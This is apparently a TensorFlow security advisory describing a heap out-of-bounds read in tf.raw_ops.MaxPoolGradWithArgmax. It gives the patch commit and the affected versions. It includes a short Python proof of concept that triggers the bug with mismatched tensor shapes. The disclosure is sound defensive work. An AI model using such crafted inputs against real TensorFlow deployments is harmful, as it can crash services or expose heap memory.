summary: "Heap out of bounds read in `MaxPoolGradWithArgmax`\n### Impact\nThe implementation\
  \ of `tf.raw_ops.MaxPoolGradWithArgmax` can cause reads outside of bounds of heap allocated\
  \ data if attacker supplies specially crafted inputs:\n\n```python\nimport tensorflow as tf\n\
  \ninput = tf.constant([10.0, 10.0, 10.0], shape=[1, 1, 3, 1], dtype=tf.float32)\ngrad = tf.constant([10.0,\
  \ 10.0, 10.0, 10.0], shape=[1, 1, 1, 4], dtype=tf.float32)\nargmax = tf.constant([1], shape=[1],\
  \ dtype=tf.int64)\nksize = [1, 1, 1, 1]\nstrides = [1, 1, 1, 1]\n  \ntf.raw_ops.MaxPoolGradWithArgmax(\n\
  \  input=input, grad=grad, argmax=argmax, ksize=ksize, strides=strides,\n  padding='SAME',\
  \ include_batch_in_index=False)\n```\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/ef0c008ee84bad91ec6725ddc42091e19a30cf0e/tensorflow/core/kernels/maxpooling_op.cc#L1016-L1017)\
  \ uses the same value to index in two different arrays but there is no guarantee that the\
  \ sizes are identical. \n\n### Patches\nWe have patched the issue in GitHub commit [dcd7867de0fea4b72a2b34bd41eb74548dc23886](https://github.com/tensorflow/tensorflow/commit/dcd7867de0fea4b72a2b34bd41eb74548dc23886).\n\
  \nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow\
  \ 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected\
  \ and still in supported range.\n\n### For more information\nPlease consult [our security\
  \ guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information\
  \ regarding the security model and how to contact us with issues and questions. \n\n### Attribution\n\
  This vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team."
